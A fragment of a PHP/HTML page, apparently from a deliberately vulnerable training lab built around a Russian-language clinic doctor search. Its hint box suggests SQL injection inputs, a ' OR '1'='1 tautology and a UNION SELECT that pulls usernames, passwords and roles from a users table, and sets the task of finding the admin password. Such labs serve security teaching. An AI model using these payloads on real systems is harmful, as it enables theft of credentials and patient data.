...
<body>
    ...
    <div class="container">
        ...
        <div style="margin-top: 30px; background: #f8f9fa; padding: 15px; border-radius: 5px;">
            ...
            <p>Попробуйте эти варианты поиска:</p>
            <ul>
                <li><code>Терапевт</code> - найти всех терапевтов</li>
                <li><code>' OR '1'='1</code> - показать всех врачей</li>
                <li><code>' UNION SELECT id,username,password,role,5,6 FROM users WHERE '1'='1</code> - найти пользователей системы</li>
            </ul>
            <p><strong>Задача:</strong> Найдите пароль пользователя admin чтобы получить доступ к поиску пациентов!</p>
        </div>
        <?php endif; ?>
    </div>
</body>
